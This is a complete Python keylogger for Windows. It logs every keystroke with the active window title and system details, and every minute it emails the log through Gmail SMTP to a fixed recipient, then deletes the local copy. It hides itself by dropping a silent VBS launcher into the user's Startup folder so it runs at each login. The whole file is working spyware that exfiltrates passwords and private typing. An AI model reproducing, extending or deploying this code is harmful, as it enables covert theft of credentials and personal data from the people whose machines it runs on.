import datetime
import smtplib
import getpass
import os
import time
import platform

from email.encoders import encode_base64
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from win32gui import GetWindowText, GetForegroundWindow

ventana_activa = 0

def key_listener():
    d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    file_name = 'keylogger_{}.txt'.format(d)
    f = open(file_name, 'w')

    f.write('----------------------------------------------\n')
    f.write(str(f"Nombre del dispositovo: {platform.node()} \n"))
    f.write(str(f"Sistema operativo: {platform.system()} de {platform.architecture()[0]} \n"))
    f.write(str(f"Version: {platform.version()} \n"))
    f.write('----------------------------------------------\n\n')

    t0 = time.time()

    def key_recorder(key):

        key = str(key)
        global ventana_activa

        if ventana_activa != GetForegroundWindow():
            f.write('\n-------> ' + str(GetWindowText(GetForegroundWindow())) + ' <-------\n')
            ventana_activa = GetForegroundWindow()

        if key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.space':
            f.write(key.replace('Key.space', ' '))
        elif key == 'Key.backspace':
            f.write(key.replace('Key.backspace', ''))
        elif key == 'Key.delete':
            f.write(key.replace('Key.delete', ''))
        elif key == 'Key.shift':
            f.write(key.replace('Key.shift', ''))
        elif key == 'Key.shift_r':
            f.write(key.replace('Key.shift_r', ''))
        elif key == 'Key.left':
            f.write(key.replace('Key.left', ''))
        elif key == 'Key.right':
            f.write(key.replace('Key.right', ''))
        elif key == 'Key.alt_gr':
            f.write(key.replace('Key.alt_gr', ''))
        elif key == 'Key.ctrl_l':
            f.write(key.replace('Key.ctrl_l', ''))
        elif key == 'Key.ctrl_r':
            f.write(key.replace('Key.ctrl_r', ''))
        elif key == 'Key.tab':
            f.write(key.replace('Key.tab', '    '))
        elif key == "'\\x03'":                              # Salida de emergencia control + c
            f.write('\n\nCerrando . . .')
            f.close()
            quit()
        else:
            f.write(key.replace("'", ""))

        if time.time()-t0 > 60:
            f.close()
            enviar_datos(file_name)
            os.remove(file_name)
            key_listener()

    with Listener(on_press=key_recorder) as listener:
        listener.join()

def enviar_datos(archivo):

    def cargar_key():
        return open('pass.key', 'rb').read()

    key = cargar_key()

    clave = Fernet(key)
    pass_enc = (open('pass.enc', 'rb').read())
    password = clave.decrypt((pass_enc)).decode()

    msg = MIMEMultipart()
    mensaje = 'Mensaje que se enviará'

    msg['FROM'] = 'email_1@gmail.com'
    msg['To'] = 'email_2@gmail.com'
    msg['Subject'] = 'Asunto del mensaje'

    msg.attach(MIMEText(mensaje, 'plain'))

    attachment = open(archivo, 'r')

    adjunto = MIMEBase('application', 'octect-stream')
    adjunto.set_payload((attachment).read())
    encode_base64(adjunto)
    adjunto.add_header('Content-Disposition',"attachment; filename= %s" % str(archivo))
    msg.attach(adjunto)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()

def mover_fichero():
    USER_NAME = getpass.getuser()
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))

    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        bat_file.write('python "main.py"')

    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Set WinScriptHost = Nothing\n')


if __name__ == '__main__':
    mover_fichero()
    key_listener()
